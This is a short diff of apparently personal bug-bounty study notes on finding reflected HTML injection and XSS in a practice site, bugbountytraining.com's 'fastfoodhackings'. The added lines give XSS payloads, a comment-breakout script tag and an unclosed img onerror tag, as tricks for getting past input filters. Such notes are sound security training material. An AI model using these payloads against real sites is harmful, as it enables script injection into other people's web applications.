@@ -440,3 +440,9 @@ https://www.bugbountytraining.com/fastfoodhackings/index.php?act=logintesttest
 [+] add a random word to the login e.g <testtest>
 https://www.bugbountytraining.com/fastfoodhackings/index.php?act=-->logintesttest
 [+] check if test reflects in page, try to bold it to be sure e.g {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><b>logintestest</b>}
+- if HTML injection reflects, replace injection with an XSS & and leave the last HTML tag open because of the comment "-->" {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><script>alert(3)</script}
+- if you're stil getting filtered try a tag that does not need to be closed e.g "img" and leave the end > open {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><img src=x onerror=alert(2)}
+
+#Manipulate number specific date picker 
+[+]
+- 
